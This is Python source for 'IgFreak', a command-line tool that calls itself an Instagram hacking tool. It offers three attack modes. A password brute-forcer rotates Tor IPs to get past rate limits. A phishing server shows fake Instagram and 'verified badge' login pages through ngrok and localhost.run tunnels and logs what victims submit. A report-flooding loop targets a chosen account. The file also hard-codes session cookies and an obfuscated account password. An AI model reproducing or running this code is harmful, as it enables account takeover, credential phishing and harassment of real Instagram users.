    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': 'bc3d5af829ea',
    'x-requested-with': 'XMLHttpRequest'}
	import base64
	username = "igfreak_reporter"
	password = base64.b64decode(b'YW5zaDEyMzQ=')
    
	data = {
         'username': f'{username}',
         'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{str(password.decode())}',
         'queryParams': '{}',
         'optIntoOneTap': 'false'}    
	r = rs.post(url, headers=headers, data=data)
	if  'authenticated":true' in r.text or 'userId' in r.text:
		rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
		pass
	else:
		error("Login Failed")
		error(r.text)
		return sys.exit(0)



	if xx == 1:
		fid="1"
	if xx == 2:
		fid="5"
	if xx == 3:
		fid="8"
	if xx == 4:
		fid="8"
	if xx == 5:
		fid="7"
	if xx == 6:
		fid="2"
	if xx == 7:
		fid="6"
	else:
		fid="1"
	n=0
	nu=0
	u = rs.get(f"https://www.instagram.com/{id}/?__a=1")
	i1d =  str(u.json()["graphql"]["user"]["id"])
	print(G+"\nTarget : "+f"{id} : {C} {i1d}\n")
	for i_1 in range(1,amount):
		url_1=f'https://www.instagram.com/users/{i1d}/report/'
		data_1={'source_name':'',
		'reason_id':f'1',
		'frx_context':''}
		report_1=rs.post(url_1,data=data_1)
		if '"status":"ok"' in report_1.text:
			nu += 1
		else:
			n += 1
		sys.stdout.write(G+f"\r{W}[{R+str(i_1)}{W}]{G} Sent = {C}{nu}  {Y}Error = {R} {n}")
		sys.stdout.flush()
		import time
		time.sleep(wait)
	print(G+"\n\n Done . Sent Successfull !")    		
	
	
import argparse 

cli_parser = argparse.ArgumentParser(add_help=False)
# nargs = '+' , makes them positional argument.
cli_parser.add_argument('-username',  # parse username from command line
                        '-u',
                        type=str,
                        help='username for Instagram account'
                        )
cli_parser.add_argument('-template',  # parse username from command line
                        '-t',
                        type=str,
                        help='username for Instagram account'
                        )

cli_parser.add_argument('-password-list',  # parse path to password list file
                        '-pl',
                        type=str,
                        help='password list file to try with the given username.'
)
cli_parser.add_argument('-amount',  # parse path to password list file
                        '-am',
                        type=str,
                        help='Amount of reports.'
)
cli_parser.add_argument('-id',  # parse path to password list file
                  
                        type=str,
                        help='Amount of reports.'
)
cli_parser.add_argument('--verbose',  # check if the user wants verbose mode enabled
                        '--v',
                        action='count',
                        help='Activate Verbose mode. ( Verbose level )'
                        )
                        
cli_parser.add_argument('--bruteforce',  # parse path to password list file
                        '--b',
                        action='store_true',
                        help='password list file to try with the given username.'
                        )
cli_parser.add_argument('--phish',  # parse path to password list file
                        '--p',
                        action='store_true',
                        help='Phish any instagram account'
                        )
cli_parser.add_argument('--report',  # parse path to password list file
                        '--r',
                        action='store_true',
                        help='Phish any instagram account')
cli_parser.add_argument('--help',  # parse path to password list file
                        '-h','-help',
						action='store_true',
                        
                        help=help
                        )
cli_parser.add_argument('--update',  # parse path to password list file
                    
						action='store_true',
                        
                        help=help
                        )

pwd = os.getcwd()

def phish(template):
	printInfo("Phisher ")
	os.system('pkill php')
	print()
	import random
	port = random.randint(1111,9999)
	print(f"""

	{C} Template : {G} {template}
	{C} Server   : {G} Ngrok
        {C} Port     : {G} {port}
	
	{B}       STARTING SERVERS
{G}{"="*25}{Y}  LOGS  {G}{"="*25}{R}""")
	a = startServicea(template+"/",port)
	link = a["link"]
	link2 = a["link2"]
	if link=="":
		print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
		print(f"{R}NGROK LINK DEPLOY FAILED")
		pass
	else:
		print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
		print(f"\n{G} NGROK LINK = {Y} {link}")
		print(f"{G} LINK STATUS CODE = {W}[{G}{requests.get(link).status_code}{W}] ")
		print(f"{G} SHORT LINK = {Y} {short(link)}\n")
	print(f"\n{B} LOCALHOST.RUN LINK = {Y} {link2}")
	print(f"{B} LINK STATUS CODE = {W}[{G}{requests.get(link2).status_code}{W}] ")
	print(f"{B} SHORT LINK = {Y} {short(link2)}")
	print()
	print(f"{B}[{G}>{B}]{W} Wating for victims ...[ {G} Press Ctrl + C to exit {W} ]")
	def check(file):
		if os.path.exists(file):
			return True
		else:
			return False
	def ok():
		while True:
			a = check("ip.txt")
			if a==True:
				os.system('cat ip.txt')
				os.remove('ip.txt')
				continue
			else:
				continue		
	try:
		ok()

	except Exception as e:
		os.system("pkill php")
		print(f"\n{R} Exiting , Error : {G} {str(e)}")
		

	exit()

def startServicea(folder,port):
	import os
	os.chdir(folder)
	os.system("rm pass.txt ip.txt gmail.txt > /dev/null 2&>1")
	

	code = f"""php -S 127.0.0.1:{port}> /dev/null 2>&1 &"""
	fileok = os.system(code)
	import time
	time.sleep(3)
	try:
		link =  ngrok.connect(port,'http')
		ngrok.get_ngrok_process().stop_monitor_thread()
		link = str(link).replace('NgrokTunnel: "','')
		link = link[:-28]
	except Exception as e:
		link = ""
		pass
	command = f"""echo 'ssh -R 80:localhost:{port} nokey@localhost.run > ok.txt' > tmp.sh && sh -c 'sh tmp.sh > /dev/null 2>&1  &' && rm tmp.sh && sleep 10 && cat ok.txt | grep -o "https://[0-9A-Za-z.-]*\.lhr.life" && rm ok.txt"""
	oo = subprocess.check_output(command,shell=True)
	link2 = (str(oo.decode())[:-1])
	return {"link" : link ,"link2" : link2}

def printInfo(str):
	print(f"{Fore.MAGENTA}IgFreak , Slick Instagram Hacking command line tool. Copyright (C) 2021, T-Dynamos Ansh Dadwal\n .")
	os.system(f"dat=$(date) && echo {G}[{W}✓{G}] {C}Started {str} on {G}$dat")
def error(str):
	print()
	print(R+"E:"+Y+str)
def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
Parsed = cli_parser.parse_args()


def ExecuteIgFreak():
    Parsed = cli_parser.parse_args()
    
    if Parsed.update == True:
    	print("Updating...")
    	sys.exit(0)
    if Parsed.bruteforce == True:
    	if os.system("command -v tor > /dev/null") != 0:
    		print(f"{R}Tor not found or not installed")
    		sys.exit()
    	if Parsed.username is None:
    		error(" Please provide a username") 
    	elif Parsed.password_list is None:
    		error(" Please provide a passlist")
    	elif Parsed.username is not None and Parsed.password_list is not None:
    			printInfo("Bruteforcer")
    			check_intr()
    			if os.path.exists(Parsed.password_list):
    				import requests
    				response = requests.get("https://instagram.com/" + Parsed.username + "/")
    				if response.status_code == 404 :
    				         	error("Instagram account does not exists")
    				         	exit()
    				else:
    				         	pass
    				         	check_tor()
    				         	start = timer()
    				try:
    				         Bruteforce(Parsed.password_list,Parsed.username)
    				except Exception as e:
    				         	error(str(e))
    				         	print(f"\n{R} Exiting")
    				         	sys.exit(456)
    			else:
    				error(" Password list not found ")
    				sys.exit(1)
    elif Parsed.help == True:
    	print(help)
    	exit()
   

    elif Parsed.phish == True:
    	check_d()
    	if Parsed.template  is not None:
    		if Parsed.template == "instafollowers" or Parsed.template == "instagram" or Parsed.template == "igbadges":
    			phish(Parsed.template)
    		else:
    			error(f"Template {R+Parsed.template+Y} not found")
    			print()
    			print(f"{W} Available Templates")
    			print(f"""
{G}Template      Description{W}
    			
{B}igbadges       : {W}Hack account by confirming account in get verified badges
{B}instagram      : {W}Instagram simple login page 
{B}instafollowers : {W}Get Instagram accounts by seeking followers""")
    			exit(1)
    		print()
    		try:
    			phish(Parsed.template)
    		except exception:
    			print(f"\n\n{Y} Exiting ")
    			pass   			
    		exit(0)
    	elif Parsed.template is None:
    		print()
    		error("Please Provide a template")
    		exit()
    elif Parsed.report == True: 
    	if Parsed.username is not None:
    		if Parsed.amount is not None:
    			if Parsed.id is not None:
    				report(Parsed.username,int(Parsed.id),int(Parsed.amount),0.5)
    	else:
    		error("Please provide a username")
    		exit()
    	
    else:
    	print(help)
    	pass


import requests
from stem.control import Controller
from stem import Signal

def get_tor_session():
    # initialize a requests Session
    session = requests.Session()
    # setting the proxy of both http & https to the localhost:9050 
    # this requires a running Tor service in your machine and listening on port 9050 (by default)
    session.proxies = {"http": "socks5://localhost:9050", "https": "socks5://localhost:9050"}
    return session

def renew_connection():
    with Controller.from_port(port=9051) as c:
        c.authenticate()
        # send NEWNYM signal to establish a new clean connection through the Tor network
        c.signal(Signal.NEWNYM)
url = 'https://www.instagram.com/accounts/login/ajax/'
import random
	
def signin(password,username):

        
         user=ua.random
		  
         headers = {
     'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-length': '275',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    f'user-agent': user,
    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': 'bc3d5af829ea',
    'x-requested-with': 'XMLHttpRequest'
    }


         data = {'username': f'{username}',
         'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
         'queryParams': '{}',
         'optIntoOneTap': 'false'}
         por = {"http": "http://localhost:9876", "https": "http://localhost:9876"}
         ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
         por2 = {"http": f"http://{ipc}:80", "https": f"https://{ipc}:80"}

         print(f"{B}[{G}>{B}]{W} Using Agent : {G}{user}")
         renew_connection()
         s = get_tor_session()
         ipc = requests.get("https://httpbin.org/ip").json()['origin']
         print(f"{B}[{G}>{B}]{W} Current ip : {G}{ipc}")
         ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
         print(f"{B}[{G}>{B}]{W} Changed ip : {G}{ipc}")
         print(f"{B}[{G}>{B}]{W} Using Proxy : {G}{por2}")

         try:
         	r = requests.post(url, headers=headers, data=data,proxies=por,timeout=10)
         except Exception as e:
         	error(str(e))
         	exit()
         print(f"{B}[{G}>{B}] {W}Response   : {W}{r.json()['status']}")
         try:
         	print(f"{B}[{G}>{B}] {R}Message    : {W}{r.json()['message']}")
         except KeyError:
         	pass
         if r.json()['status'] == "fail":
         	print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
         	signin(password,username)
         	pass
         else:
         	pass
         
         
         if  'authenticated":true' in r.text or 'userId' in r.text:
         	rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
         	print(f"{B}[{G}>{B}] {W}Authenticated : {W} True")
         	print(f"{G}[{Y}!{G}] {Y}Password found : {B}",password)
         	strtxt = username+".igfreak"
         	filepass = open(strtxt,"w")
         	filepass.writelines(f"Username : {username}\nPassword : {password}")
         	filepass.close()
         	print()
         	head(f"Saved as : {strtxt}")
         	end = timer()
         	print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	    
         	s = rs.Session()
         	s.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
         	return sys.exit(456)
         else:
         	pass
         	return False



def changeip():
	s = get_tor_session()
	ipc = requests.get("https://httpbin.org/ip").json()['origin']
	print(f"{B}[{G}>{B}]{W} Current ip : {G}{ipc}")
	renew_connection()
	s = get_tor_session()
	por = {"http": "http://localhost:9876", "https": "http://localhost:9876"}
	ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
	print(f"{B}[{G}>{B}]{W} Changed ip : {G}{ipc}")

def head(str):
	print(R+"["+G+">"+R+"] "+C+str)
def Bruteforce(passlist,username):
	n_words = len(list(open(passlist, "rb")))
	head(f"Total passwords to test: {B}"+ str(n_words))
	print(f"\n{R}║{W} Instagram Id = {G}{username}{W}{R} ║")

	with open(passlist, 'rb') as file:
	           for line in file:
	               for word in line.split():
	                   		print("\n")
	                   		print(f"{Y}[{W}+{Y}]{C} Testing password : {G}"+word.decode())  
	                   		trial = signin(word.decode(),username)
	                   		if trial == True:
	                   			end = timer()
	                   			print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	                   	
	                   			sys.exit(1)
	                   		else:
	                   			continue
	end = timer()
	print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	
	exit()

def check_igid(username):
    try:
        u = rs.get(f"https://www.instagram.com/{username}/?__a=1")
        id =  str(u.json()["graphql"]["user"]["id"])
        pass
  
    except Exception as e:
    	error("Check the victim's account")
    	exit()

if __name__=="__main__":
	ExecuteIgFreak()   
else:
	pass
